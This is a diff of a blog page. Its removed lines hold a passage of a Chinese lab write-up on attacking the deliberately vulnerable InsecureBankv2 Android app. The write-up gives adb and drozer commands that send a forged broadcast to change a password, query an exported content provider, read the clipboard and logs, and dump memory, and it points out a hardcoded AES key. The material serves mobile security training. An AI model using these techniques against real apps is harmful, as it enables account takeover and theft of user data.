-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb shell am broadcast -a theBroadcast -n com.android.insecurebankv2/com.android.insecurebankv2.MyBroadCastReceiver --es phonenumber 15210601846 --es newpass Dinesh@123$ 可以直接启动一个广播</div></pre></td></tr></table></figure>
-<ul>
-<li>可以使用drozer 启动：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run app.broadcast.send --action theBroadcast --component com.android.insecurebankv2 com.android.insecurebankv2.MyBroadCastReceiver --extra string phonenumber 15210601846 --extra string newpass ddddsadsad</div></pre></td></tr></table></figure>
-<h3 id="hack-数据库，provider"><a href="#hack-数据库，provider" class="headerlink" title="hack 数据库，provider"></a>hack 数据库，provider</h3><ul>
-<li><p>drozer里面的命令<code>run scanner.provider.finduris -a com.android.insecurebankv2</code><br>扫描可以利用的provider</p>
-</li>
-<li><p>利用 <code>run app.provider.query</code> 进行查询  </p>
-</li>
-<li><p>在代码中主要是在manifest中查找可以用的provider，再在代码中查看provider的url链接</p>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers 查看</div></pre></td></tr></table></figure>
-<h3 id="攻击复制的数据"><a href="#攻击复制的数据" class="headerlink" title="攻击复制的数据"></a>攻击复制的数据</h3><p><code>adb shell su u0_a51 service call clipboard 2 s16 包名</code></p>
-<h3 id="攻击数据库"><a href="#攻击数据库" class="headerlink" title="攻击数据库"></a>攻击数据库</h3><p>若是数据库没有加密的话，直接pull下来，查看即可</p>
-<h3 id="不安全的log"><a href="#不安全的log" class="headerlink" title="不安全的log"></a>不安全的log</h3><p>直接ddms或者adb logcat读取敏感数据</p>
-<h3 id="导出内存数据（未测试）"><a href="#导出内存数据（未测试）" class="headerlink" title="导出内存数据（未测试）"></a>导出内存数据（未测试）</h3><p>ddms导出hprof ，利用platform-tools 工具：./hprof-conv com.android.insecurebankv2.hprof  SSSSS.hprof格式化，利用app的内存分析工具分析内存。</p>
-<h3 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h3><p>在sharepreferen中可以看到用户名和密码信息，不过都是采用了加密的处理,但是在代码中可以看到采用了硬加密的处理方式,并且有明文的iv和密钥信息，采用的AES的cbc模式加密处理</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/移动安全/">移动安全</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/移动安全/drozer测试InsecureBankv2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
     </nav>
   
 
